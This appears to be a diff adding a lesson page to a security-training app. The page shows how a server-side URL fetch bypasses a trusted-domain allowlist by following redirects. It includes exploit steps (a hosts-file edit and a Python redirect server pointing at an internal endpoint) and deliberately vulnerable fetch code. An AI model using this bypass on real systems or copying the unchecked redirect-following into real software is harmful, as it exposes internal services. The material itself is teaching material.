@@ -1,0 +1,86 @@
+{% extends "core/example_page_base.html" %}
+{% set example_title = "Open Redirect Bypasses a Trusted-Domain Allowlist" %}
+{% set example_difficulty = "Hard" %}
+{% block title %}{{ example_title }} — A10{% endblock %}
+
+{% block explanation %}
+<p>
+  This "fetch from an approved content mirror" feature does the right
+  thing on the surface -- it checks the submitted URL's host against an
+  allowlist of trusted partners, not a fragile blocklist. The gap: it
+  only ever validates the URL the client submitted. If that URL
+  redirects somewhere else, the fetch follows the redirect without
+  checking the new destination against anything.
+</p>
+{% endblock %}
+
+{% block detect %}
+<p>
+  Submitting a URL for a host that isn't on the allowlist is correctly
+  rejected. Submitting an approved host's URL is correctly fetched. The
+  gap only appears once an approved host's URL turns out to redirect
+  somewhere else.
+</p>
+{% endblock %}
+
+{% block exploitation %}
+<p>
+  This exploit needs two things you control, since no real DNS record
+  exists for the allowlisted domain in this training environment:
+</p>
+<ol>
+  <li>
+    Make the allowlisted domain resolve to your own machine:
+    <pre><code class="language-bash">echo "127.0.0.1 trusted-mirror.example" | sudo tee -a /etc/hosts</code></pre>
+  </li>
+  <li>
+    Serve a redirect to this app's internal-only endpoint:
+    <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class Redirect(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header("Location", "http://127.0.0.1:5000/a10/internal/metadata")
+        self.end_headers()
+
+HTTPServer(("127.0.0.1", 8080), Redirect).serve_forever()</code></pre>
+  </li>
+</ol>
+<p>
+  Then submit <code>http://trusted-mirror.example:8080/</code> below.
+  The allowlist check sees and approves
+  <code>trusted-mirror.example</code> -- and the fetch follows the
+  redirect straight to the internal-only endpoint anyway.
+</p>
+{% endblock %}
+
+{% block vulnerable_code %}hostname = urllib.parse.urlparse(mirror_url).hostname
+if hostname not in ALLOWED_MIRROR_HOSTS:
+    error = "Only approved content mirrors are allowed."
+else:
+    with urllib.request.urlopen(mirror_url, timeout=5) as resp:
+        result = resp.read().decode("utf-8", errors="replace")
+# urlopen() follows redirects by default and never re-checks the
+# Location header's host against ALLOWED_MIRROR_HOSTS
+{% endblock %}
+
+{% block secure_code %}# Disable automatic redirect-following and re-validate every hop's host
+# against the same allowlist before following it manually.
+{% endblock %}
+
+{% block live_example %}
+<form method="post">
+  <div class="mb-2">
+    <label class="form-label">Mirror URL</label>
+    <input class="form-control" type="text" name="mirror_url" value="{{ mirror_url }}">
+  </div>
+  <button type="submit" class="btn btn-primary">Fetch From Mirror</button>
+</form>
+{% if result %}
+<p class="mt-3">Response:</p>
+<pre><code class="language-text">{{ result }}</code></pre>
+{% endif %}
+{% if error %}
+<p class="mt-3 text-danger">{{ error }}</p>
+{% endif %}
+{% endblock %}
